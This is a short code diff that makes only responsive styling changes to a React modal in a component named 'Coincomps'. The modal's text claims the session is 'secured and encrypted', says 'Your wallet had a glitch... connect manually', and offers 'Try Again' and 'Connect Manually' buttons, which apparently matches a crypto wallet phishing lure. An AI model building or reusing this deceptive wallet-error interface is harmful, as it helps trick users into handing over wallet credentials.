@@ -61,7 +61,7 @@ const Coincomps = ({ data }) => {
       {selectedItem && (
         <div className="fixed top-0 left-0 w-full h-full bg-gray-800 bg-opacity-75 flex justify-center items-center">
           <div className=" flex  flex-col gap-[20px] items-center bg-white p-4 rounded-lg">
-            <MdCancel  onClick={handleCloseModal} color='black'  className='absolute cancel bg-white hover:cursor-[pointer]  h-[30px] w-[30px] rounded-full'/>
+            <MdCancel  onClick={handleCloseModal} color='black'  className='absolute cancel bg-white hover:cursor-[pointer]  h-[30px] w-[30px] rounded-full md:right-[20px] right-0 md:top-1 bottom-[12px]'/>
             <img
               src={selectedItem.src}
               alt=""
@@ -72,11 +72,11 @@ const Coincomps = ({ data }) => {
               <p className='text-[25px] text-gray-500 font-[400] text-center'>This session is secured and encrypted</p>
             </div>
             <div>
-              <p className='text-[15px] text-center text-red-600 font-[400] border border-red-600 px-[15px] py-[5px] w-[30vw] rounded'>Your wallet had a glitch... connect manually</p>
+              <p className='text-[15px] text-center text-red-600 font-[400] border border-red-600 px-[15px] py-[5px] rounded sm:w-[100%] '>Your wallet had a glitch... connect manually</p>
             </div>
             <div className='flex flex-col gap-4 w-[30vw]'>
-              <button className='text-[20px] font-[300] text-center border border-blue-600 rounded-xl py-[5px]'>Try Again</button>
-              <button className='text-[20px] text-white font-[20px] bg-blue-600 rounded-xl py-[5px]'>Connect Manually</button>
+              <button className='text-[20px] font-[300] text-center border border-blue-600 rounded-xl py-[5px] px-[10px] sm:w-[100%]'>Try Again</button>
+              <button className='text-[20px] text-white font-[20px] bg-blue-600 rounded-xl py-[5px] sm:w-[100%]'>Connect Manually</button>
             </div>
 
             <div className=''>
